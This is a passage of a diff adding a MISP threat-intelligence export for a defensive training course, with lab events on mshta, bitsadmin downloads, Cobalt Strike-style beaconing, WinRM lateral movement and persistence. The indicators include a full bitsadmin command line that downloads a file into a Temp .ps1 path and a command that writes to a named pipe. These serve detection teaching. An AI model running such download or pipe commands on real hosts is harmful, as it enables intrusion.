+            "content": "# LAB-2.3 \u2014 LOLBAS Proxy Execution: mshta.exe\n\n**Case:** CJ-006  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-07-15  \n**ATT&CK:** T1218.005\n\n## Analyst narrative\nStudents investigate mshta proxy execution that launches a scriptlet over HTTPS and pivots into spawned child process behavior.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- cmd_mshta_javascript_getobject_sct_2020-10-2202214475.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "d73c566c-9cb8-5633-a346-a54ae0da3b39",
+        "info": "IgniteCyber CJ LAB-2.4: Stage 2 Download: bitsadmin.exe",
+        "date": "2025-07-17",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-2.4"
+          },
+          {
+            "name": "case:CJ-007"
+          },
+          {
+            "name": "day:day-2"
+          },
+          {
+            "name": "attack:technique=\"T1197\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"BITS Jobs - T1197\""
+          },
+          {
+            "name": "attack:technique=\"T1105\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Ingress Tool Transfer - T1105\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "12059d31-91dc-555e-b47c-d1b2d9d3ad9e",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-007",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-17",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "2fb75847-5e23-59cc-90a6-9c76e182f5b9",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-2.4_BITSADMIN_Download_T1197.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-17",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "7f69e927-06a8-5ca3-990f-a62fef466fb0",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=cmd_bitsadmin_download_psh_script_2020-10-2302365189.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-17",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "c859b468-377a-5a41-a4dd-0f705b5a8868",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "bitsadmin.exe",
+            "to_ids": false,
+            "comment": "LOLBAS downloader observed in process creation telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-17",
+            "Tag": [
+              {
+                "name": "source:windows-lolbas-binary"
+              },
+              {
+                "name": "lab:LAB-2.4"
+              }
+            ]
+          },
+          {
+            "uuid": "e60570a6-841e-5d83-9a9c-1b2693280d8a",
+            "type": "url",
+            "category": "Network activity",
+            "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md",
+            "to_ids": false,
+            "comment": "BITSAdmin source URL observed in command line.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-17",
+            "Tag": [
+              {
+                "name": "source:training-source-url"
+              },
+              {
+                "name": "lab:LAB-2.4"
+              }
+            ]
+          },
+          {
+            "uuid": "f233eece-465c-5a2d-ace2-385e6b20d84c",
+            "type": "ip-dst",
+            "category": "Network activity",
+            "value": "151.101.208.133",
+            "to_ids": false,
+            "comment": "Remote IP observed for BITSAdmin download.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-17",
+            "Tag": [
+              {
+                "name": "source:observed-cdn-endpoint"
+              },
+              {
+                "name": "lab:LAB-2.4"
+              }
+            ]
+          },
+          {
+            "uuid": "3174416c-05b5-5f54-94bb-8a2d60ad2050",
+            "type": "filepath",
+            "category": "Artifacts dropped",
+            "value": "C:\\Users\\wardog\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+            "to_ids": true,
+            "comment": "Destination path observed in BITSAdmin command line.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-17",
+            "Tag": [
+              {
+                "name": "source:download-target"
+              },
+              {
+                "name": "lab:LAB-2.4"
+              }
+            ]
+          },
+          {
+            "uuid": "17fdd04d-cb96-59ab-9673-afb965c87e53",
+            "type": "command-line",
+            "category": "External analysis",
+            "value": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\wardog\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+            "to_ids": true,
+            "comment": "Full command line observed in Windows Security Event ID 4688.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-17",
+            "Tag": [
+              {
+                "name": "source:detection-indicator"
+              },
+              {
+                "name": "lab:LAB-2.4"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "50b95741-3ff0-5bbd-aa82-0da22b61ba7e",
+            "name": "LAB-2.4 CTI Event Report",
+            "content": "# LAB-2.4 \u2014 Stage 2 Download: bitsadmin.exe\n\n**Case:** CJ-007  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-07-17  \n**ATT&CK:** T1197, T1105\n\n## Analyst narrative\nStudents investigate BITSAdmin used as a living-off-the-land downloader and record the download URL, target path, and process evidence.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- cmd_bitsadmin_download_psh_script_2020-10-2302365189.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "b85d86c7-a2d7-5ae6-9aa6-94bc001d0ca0",
+        "info": "IgniteCyber CJ LAB-3.1: C2 Beacon Investigation (Cobalt Strike patterns)",
+        "date": "2025-08-05",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-3.1"
+          },
+          {
+            "name": "case:CJ-008"
+          },
+          {
+            "name": "day:day-3"
+          },
+          {
+            "name": "attack:technique=\"T1071.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Web Protocols - T1071.001\""
+          },
+          {
+            "name": "attack:technique=\"T1573.002\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Asymmetric Cryptography - T1573.002\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "b75fafd1-ec6e-5b99-9b73-08f1ed38b15a",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-008",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-05",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "c5f5d22f-ee81-52af-a7cb-0e5703a4f1f8",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-3.1_C2_Beacon_Investigation_CobaltStrike.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-05",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "6136e8de-1f1b-560e-b633-7b5f6b95cf7e",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=aptsimulator_cobaltstrike_2021-06-11T21081492.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-05",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "7701052b-bb29-55fe-a0f5-26c2d7135e0f",
+            "type": "url",
+            "category": "Network activity",
+            "value": "http://10.0.2.15/pixel.gif",
+            "to_ids": true,
+            "comment": "HTTP beacon-like URL observed in APTSimulator/Cobalt Strike pattern dataset.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-05",
+            "Tag": [
+              {
+                "name": "source:c2-pattern-indicator"
+              },
+              {
+                "name": "lab:LAB-3.1"
+              }
+            ]
+          },
+          {
+            "uuid": "247aa2fa-8ea2-53c2-8851-5f3da32bc3e2",
+            "type": "ip-dst",
+            "category": "Network activity",
+            "value": "10.0.2.15",
+            "to_ids": false,
+            "comment": "C2-style destination IP observed with pixel.gif retrieval.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-05",
+            "Tag": [
+              {
+                "name": "source:lab-private-ip"
+              },
+              {
+                "name": "lab:LAB-3.1"
+              }
+            ]
+          },
+          {
+            "uuid": "d98d258f-f5de-54cc-8ab8-1159fb005a3f",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "CreateNamedPipe.exe",
+            "to_ids": true,
+            "comment": "Tooling/process observed during Cobalt Strike pattern simulation.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-05",
+            "Tag": [
+              {
+                "name": "source:tooling-indicator"
+              },
+              {
+                "name": "lab:LAB-3.1"
+              }
+            ]
+          },
+          {
+            "uuid": "987fc9ab-4109-5618-ab77-cfaac3defca1",
+            "type": "named pipe",
+            "category": "Artifacts dropped",
+            "value": "\\\\.\\pipe\\334485",
+            "to_ids": true,
+            "comment": "Named pipe observed in service command behavior.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-05",
+            "Tag": [
+              {
+                "name": "source:named-pipe-behavior"
+              },
+              {
+                "name": "lab:LAB-3.1"
+              }
+            ]
+          },
+          {
+            "uuid": "cf107555-dfeb-5423-8218-cdc34852e4af",
+            "type": "command-line",
+            "category": "External analysis",
+            "value": "C:\\Windows\\system32\\cmd.exe echo /c b6a1458f396 > \\\\.\\pipe\\334485",
+            "to_ids": true,
+            "comment": "Command line observed writing to named pipe.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-05",
+            "Tag": [
+              {
+                "name": "source:behavioral-indicator"
+              },
+              {
+                "name": "lab:LAB-3.1"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "b9be9286-6ae5-5780-801b-e02a837b8af6",
+            "name": "LAB-3.1 CTI Event Report",
+            "content": "# LAB-3.1 \u2014 C2 Beacon Investigation (Cobalt Strike patterns)\n\n**Case:** CJ-008  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-08-05  \n**ATT&CK:** T1071.001, T1573.002\n\n## Analyst narrative\nStudents pivot from suspicious process behavior to C2-like web beaconing and named-pipe behavior, then promote confirmed CTI into MISP.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- aptsimulator_cobaltstrike_2021-06-11T21081492.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "496b4bb0-8fa3-54b2-8d07-9daea94a5736",
+        "info": "IgniteCyber CJ LAB-3.2: Lateral Movement: WinRM + Remote Scheduled Tasks",
+        "date": "2025-08-07",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-3.2"
+          },
+          {
+            "name": "case:CJ-009"
+          },
+          {
+            "name": "day:day-3"
+          },
+          {
+            "name": "attack:technique=\"T1021.006\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Windows Remote Management - T1021.006\""
+          },
+          {
+            "name": "attack:technique=\"T1053.005\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Scheduled Task - T1053.005\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "cbf35d77-a876-585c-9800-cc70e5ab66ae",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-009",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-07",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "9f4f24f6-f553-5b5e-a4bf-47baf13cd8e8",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-3.2_Lateral_Movement_WinRM_Schtasks.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-07",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "5bcb7f38-eb8f-5be9-9099-857276d27e57",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=empire_schtasks_creation_standard_user_2020-09-21031526.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-07",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "92fe91b7-25eb-5cdd-9eaa-51f63cf8363c",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=schtask_modification_2020-12-1907505969.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-07",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "815d60ad-bbd1-5bd2-bb6c-7fda4b0a0591",
+            "type": "hostname",
+            "category": "Network activity",
+            "value": "WORKSTATION5.theshire.local",
+            "to_ids": false,
+            "comment": "Source/affected host in lateral movement and scheduled task telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-07",
+            "Tag": [
+              {
+                "name": "source:lab-host"
+              },
+              {
+                "name": "lab:LAB-3.2"
+              }
+            ]
+          },
+          {
+            "uuid": "1aa72a5b-2253-5bd1-b7ef-6bac5d2ddf7a",
+            "type": "hostname",
+            "category": "Network activity",
+            "value": "WORKSTATION6.theshire.local",
+            "to_ids": false,
+            "comment": "Additional host observed in lateral movement/schtasks telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-07",
+            "Tag": [
+              {
+                "name": "source:lab-host"
+              },
+              {
+                "name": "lab:LAB-3.2"
+              }
+            ]
+          },
+          {
+            "uuid": "65b0f7bd-17c7-5d58-80d0-9ab088be6834",
+            "type": "hostname",
+            "category": "Network activity",
+            "value": "MORDORDC.theshire.local",
+            "to_ids": false,
+            "comment": "Domain controller context observed in Empire scheduled task dataset.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-07",
+            "Tag": [
+              {
+                "name": "source:lab-domain-controller"
+              },
+              {
+                "name": "lab:LAB-3.2"
+              }
+            ]
+          },
+          {
+            "uuid": "b897a68a-fb6e-5b5b-9a0b-59634c2107d5",
+            "type": "user-account",
+            "category": "Attribution",
+            "value": "THESHIRE\\pgustavo",
+            "to_ids": false,
+            "comment": "User context observed in scheduled task/PowerShell telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-07",
+            "Tag": [
+              {
+                "name": "source:account-context"
+              },
+              {
+                "name": "lab:LAB-3.2"
+              }
+            ]
+          },
+          {
+            "uuid": "d71b1300-15f9-51a0-9801-561f3c01e1b4",
+            "type": "url",
+            "category": "Network activity",
+            "value": "http://schemas.microsoft.com/wbem/wsman/1/windows/shell",
+            "to_ids": false,
+            "comment": "WSMan shell URI observed in BITS/WinRM-related telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-07",
+            "Tag": [
+              {
+                "name": "source:winrm/wsman-behavior-context"
+              },
+              {
+                "name": "lab:LAB-3.2"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "e5f11702-8d88-5c6e-af3d-9ed1c302f44d",
+            "name": "LAB-3.2 CTI Event Report",
+            "content": "# LAB-3.2 \u2014 Lateral Movement: WinRM + Remote Scheduled Tasks\n\n**Case:** CJ-009  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-08-07  \n**ATT&CK:** T1021.006, T1053.005\n\n## Analyst narrative\nStudents correlate PowerShell remoting/WinRM-style activity with scheduled task creation or modification across Windows hosts.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- empire_schtasks_creation_standard_user_2020-09-21031526.json\n- schtask_modification_2020-12-1907505969.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "2af76849-1ecc-5cbb-91df-a4d0f39be6fb",
+        "info": "IgniteCyber CJ LAB-3.3: Timeline Reconstruction (Elastic-based, Timesketch optional)",
+        "date": "2025-08-12",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-3.3"
+          },
+          {
+            "name": "case:CJ-010"
+          },
+          {
+            "name": "day:day-3"
+          },
+          {
+            "name": "attack:technique=\"T1074.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Local Data Staging - T1074.001\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "cfe2bfae-80c2-5eba-bad2-58658924415c",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-010",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-12",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "c5c0a3a3-ba45-5b96-b4fe-1352f41ef373",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-3.3_Timeline_Reconstruction_Elastic_FIXED.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-12",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "94dc6c95-b70d-5785-b984-f69b12b06243",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=cmd_mshta_javascript_getobject_sct_2020-10-2202214475.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-12",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "a087db60-c2ec-5ac4-b538-a8a2aae1ee84",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=cmd_bitsadmin_download_psh_script_2020-10-2302365189.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-12",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "e50c4735-b1f0-5058-b27a-b2b32f78ef13",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=aptsimulator_cobaltstrike_2021-06-11T21081492.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-12",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "6f20a9b0-7c6a-5f1b-9d48-6a0b04376525",
+            "type": "text",
+            "category": "Other",
+            "value": "timeline:pivot=process_guid,parent_process,command_line,url,ip",
+            "to_ids": false,
+            "comment": "Timeline reconstruction pivot set for the lab.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-12",
+            "Tag": [
+              {
+                "name": "source:analyst-workflow-context"
+              },
+              {
+                "name": "lab:LAB-3.3"
+              }
+            ]
+          },
+          {
+            "uuid": "d4ec030c-f9cf-5b40-98c3-ce2c9fc1aa3e",
+            "type": "text",
+            "category": "Other",
+            "value": "CJ chain: mshta \u2192 bitsadmin \u2192 C2-like beacon \u2192 timeline report",
+            "to_ids": false,
+            "comment": "Narrative thread for timeline reconstruction.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-12",
+            "Tag": [
+              {
+                "name": "source:analyst-narrative"
+              },
+              {
+                "name": "lab:LAB-3.3"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "b059df51-c949-564a-aab0-1560d2474039",
+            "name": "LAB-3.3 CTI Event Report",
+            "content": "# LAB-3.3 \u2014 Timeline Reconstruction (Elastic-based, Timesketch optional)\n\n**Case:** CJ-010  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-08-12  \n**ATT&CK:** T1074.001\n\n## Analyst narrative\nStudents reconstruct the campaign chain from execution to transfer and C2-like behavior using evidence already promoted into TheHive and MISP.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- cmd_mshta_javascript_getobject_sct_2020-10-2202214475.json\n- cmd_bitsadmin_download_psh_script_2020-10-2302365189.json\n- aptsimulator_cobaltstrike_2021-06-11T21081492.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "e43ca73b-8926-53d7-bf8a-ad1cdf658f38",
+        "info": "IgniteCyber CJ LAB-4.1: Persistence Hunt: Run Keys + Scheduled Tasks",
+        "date": "2025-08-26",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-4.1"
+          },
+          {
+            "name": "case:CJ-011"
+          },
+          {
+            "name": "day:day-4"
+          },
+          {
+            "name": "attack:technique=\"T1547.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Registry Run Keys / Startup Folder - T1547.001\""
+          },
+          {
+            "name": "attack:technique=\"T1053.005\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Scheduled Task - T1053.005\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "9f060635-0a22-52ef-9fa8-ffffec97ecf2",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-011",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-26",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "60021d26-1f9b-5f30-b5b7-c622ce2b5699",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-4.1_Persistence_Hunt_RunKeys_Schtasks.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-26",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "52170493-4bd8-5576-b65b-312cc1f0a49d",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=empire_schtasks_creation_standard_user_2020-09-21031526.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-26",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "634370b8-0a18-5789-a686-c5eb5532e0c1",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=schtask_modification_2020-12-1907505969.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-26",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "8dfac1b8-7d56-5617-8240-651f19256c0c",
+            "type": "regkey",
+            "category": "Persistence mechanism",
+            "value": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+            "to_ids": false,
+            "comment": "Registry key repeatedly accessed in scheduled task modification telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-26",
+            "Tag": [
+              {
+                "name": "source:persistence-hunt-context"
+              },
+              {
+                "name": "lab:LAB-4.1"
+              }
+            ]
+          },
+          {
+            "uuid": "6e183c3b-cf68-5b01-9224-fd7bd0f20f99",
+            "type": "regkey",
+            "category": "Persistence mechanism",
+            "value": "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings",
+            "to_ids": false,
+            "comment": "BAM registry path observed in process execution traces.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-26",
+            "Tag": [
+              {
+                "name": "source:execution-artifact-context"
+              },
+              {
+                "name": "lab:LAB-4.1"
+              }
+            ]
+          },
+          {
+            "uuid": "d8834395-56f0-5b50-9b2c-00cf8a310631",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "cscript.exe",
+            "to_ids": false,
+            "comment": "Script host observed in scheduled task modification telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-26",
+            "Tag": [
+              {
+                "name": "source:process-context"
+              },
+              {
+                "name": "lab:LAB-4.1"
+              }
+            ]
+          },
+          {
+            "uuid": "76caf855-8602-5a81-b7ca-92746e365d84",
+            "type": "url",
+            "category": "Network activity",
+            "value": "http://schemas.microsoft.com/windows/2004/02/mit/task",
+            "to_ids": false,
+            "comment": "Scheduled task XML namespace observed in telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-26",
+            "Tag": [
+              {
+                "name": "source:scheduled-task-artifact-context"
+              },
+              {
+                "name": "lab:LAB-4.1"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "2f00e901-71a4-5c69-ba3d-6681ab440716",
+            "name": "LAB-4.1 CTI Event Report",
